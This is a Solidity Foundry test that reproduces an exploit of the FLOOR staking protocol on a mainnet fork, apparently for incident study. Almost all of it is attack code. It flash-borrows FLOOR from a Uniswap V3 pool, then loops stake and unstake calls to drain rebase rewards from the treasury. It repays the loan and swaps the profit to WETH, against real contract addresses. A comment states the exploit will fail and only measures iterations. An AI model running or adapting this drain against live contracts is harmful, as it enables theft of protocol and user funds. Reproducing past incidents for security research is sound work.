// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface Treasury {
    function excessReserves() external returns(uint256);
}

interface Distributor {
    function nextRewardFor(address _recipient) external returns(uint256);
}

interface IsFloor is IERC20{
    function circulatingSupply() external returns(uint256);
}

interface IFloorStaking {
    function unstake(
        address _to,
        uint256 _amount,
        bool _trigger,
        bool _rebasing
    ) external;
    function stake(
        address _to,
        uint256 _amount,
        bool _rebasing,
        bool _claim
    ) external returns (uint256);
    function rebase() external returns (uint256);
}

// This exp will fail. Just implement it to get the maximum iteration.

contract FloorStakingExploit is Test {
    uint flashAmount;
    IERC20 gFloor = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 floor = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
    Treasury treasury = Treasury(0x91E453f442d25523F42063E1695390e325076ca2);
    IsFloor sFloor = IsFloor(0x164AFe96912099543BC2c48bb9358a095Db8e784);
    Distributor distributor = Distributor(0x9e3CEe6cA6E4C11fC6200a17545003b6cf6635d0);
    IFloorStaking staking = IFloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
    Uni_Pair_V3 floorUniPool = Uni_Pair_V3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);

    function setUp() public {
        vm.createSelectFork("mainnet", 18068772); // replace the mainnet with your rpc_url
        vm.label(address(floor), "FLOOR");
        vm.label(address(sFloor), "sFLOOR");
        vm.label(address(gFloor), "gFLOOR");
        vm.label(address(treasury), "Treasury");
        vm.label(address(distributor), "distributor");
        vm.label(address(WETH), "WETH");
        vm.label(address(staking), "FloorStaking");
        vm.label(address(floorUniPool), "Pool");
    }

    function testExploit() public {
        flashAmount = floor.balanceOf(address(floorUniPool)) - 1;
        floorUniPool.flash(address(this), 0, flashAmount, "");
        uint256 profitAmount = floor.balanceOf(address(this));
        emit log_named_decimal_uint("FLOOR token balance of attacker", profitAmount, floor.decimals());
        floorUniPool.swap(address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), "");
        emit log_named_decimal_uint("WETH balance of attacker", WETH.balanceOf(address(this)), WETH.decimals());
    }

    function uniswapV3FlashCallback(uint256 fee0 , uint256 fee1, bytes calldata) external {
        uint i = 1;
        while(true) {
            uint attackerBalance = floor.balanceOf(address(this));
            uint stakingBalance = floor.balanceOf(address(staking));
            uint circulatingSupply = sFloor.circulatingSupply();
            if (attackerBalance + stakingBalance > circulatingSupply) {
                emit log_named_uint("Iteration", i);
                floor.approve(address(staking), attackerBalance);
                staking.stake(address(this), attackerBalance, false, true);
                uint256 mintAmount = distributor.nextRewardFor(address(staking));
                uint256 reserves = treasury.excessReserves();
                emit log_named_uint("Next reward amount ", mintAmount);
                emit log_named_uint("excess reserves", reserves);
                if (mintAmount <= reserves) {
                    uint gFloorBalance = gFloor.balanceOf(address(this));
                    staking.unstake(address(this), gFloorBalance, true, false);
                    emit log_named_decimal_uint("FLOOR token balance ", floor.balanceOf(address(this)), floor.decimals());
                    i += 1;
                } else {
                    break;
                }
            }
        }
        floor.transfer(msg.sender, flashAmount + fee1);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        floor.transfer(msg.sender, uint256(amount1Delta));
    }
}